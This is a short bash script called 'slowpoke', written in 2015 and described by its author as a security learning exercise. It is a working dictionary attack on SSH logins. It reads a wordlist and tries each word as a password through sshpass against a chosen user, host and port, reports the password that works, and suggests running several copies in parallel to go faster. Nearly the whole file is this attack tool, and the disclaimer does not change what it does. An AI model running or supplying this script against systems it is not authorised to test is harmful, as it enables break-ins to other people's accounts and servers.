#!/bin/bash
#
#	@eggs.benjamin 13/07/2015 
#
#	a very slow tool for cracking ssh passwords. 
#	this script was written as a bash/security learning exercise 
#
#	*DEPENDENCIES*
#
#	sshpass
#	-use yum or apt to get this package before running this script
#	-sshpass is omitted from the brew repository. Mac users get sshpass
#	by entering the folowing;
#
#	brew install http://git.io/sshpass.rb

#	gather argument values

while [[ $# > 0 ]]
do
	key=$1

	case $key in
		-u| --username)
			USERNAME="$2"
			shift
			;;
		-h| --host)
			HOST="$2"
			shift
			;;
		-d| --dictionary)
			DICTIONARY="$2"
			shift
			;;
		-p| --port)
			PORT="$2"
			shift
			;;
		--help)
			HELP="true"
			echo $HELP
			shift
			;;
	esac
	shift
done

#	check to see if/which parameters have been passed

if [[ $HELP == "true" ]]; then
		echo -ne "\n**slowpoke**\n\nA very slow tool for cracking ssh passwords.\n\n**DISCLAIMER**\n\nThis script was written as a bash/security learning exercise.\nIt is not meant for malicious usage.\n\n**DEPENDENCIES**\n\nsshpass\n\n-use yum or apt to get this package before running this script\n-sshpass is omitted from the brew repository. Mac users can get sshpass by entering the folowing;\n\nbrew install http://git.io/sshpass.rb\n\n@eggs.benjamin 13/07/2015\n\n**USAGE**\n\nslowpoke [ -u [ --username ]| -h [ --host ] | -d [ --dictionary ] | -p [ --port ] ] [ username | host | dictionary | port ]\n\n"
		exit 2
fi

if [ -z $USERNAME ] && [ -z $HOST ] && [ -z $DICTIONARY ] && [ -z $PORT ]; then
	echo "INFO | No arguments passed. Default settings applied"
fi

if [ -z $USERNAME ]; then
	USERNAME="$USER"
	echo "WARNING | No username specified. Default username applied"
fi

if [ -z $HOST ]; then
	HOST="localhost"
	echo "WARNING | No host specified. Default host applied"
fi

if [ -z $PORT ]; then
	PORT=22
	echo "WARNING | No port specified. Default port applied"
fi

if [ -z $DICTIONARY ]; then
	DICTIONARY="/usr/share/dict/words"
	echo "WARNING | No dictionary specified. Default dictionary applied"
fi

#	calculate dictionary length

DICT_LNGTH=$(wc -l < $DICTIONARY | sed -e 's/^[[:space:]]*//')
DICT_LNGTH=$((DICT_LNGTH + 1))

if [ $DICT_LNGTH -gt 1000 ]; then
	echo "WARNING | Dictionary length is $DICT_LNGTH"
	echo "INFO | Consider spawning multiple slowpoke processes each using a portion of this"
fi

echo "INFO | Connecting to : " $USERNAME"@"$HOST

#	launch dictionary atack on target

i=0

for p in $(cat $DICTIONARY)
do
	sshpass -p $p ssh $USERNAME"@"$HOST -p $PORT exit 2> /dev/null; result=$?

	i=$((i + 1))

	echo -ne "($i/$DICT_LNGTH)\r"

	if [[ $result == 0 ]]
		then
			echo "password is $p"
			exit 0
	elif [[ $result == 255 ]]
		then 
			echo -ne "Warning | Unable to connect to $USERNAME@$HOST on port $PORT.\n\nExiting...\n\n"
			exit 1 
	fi 
done

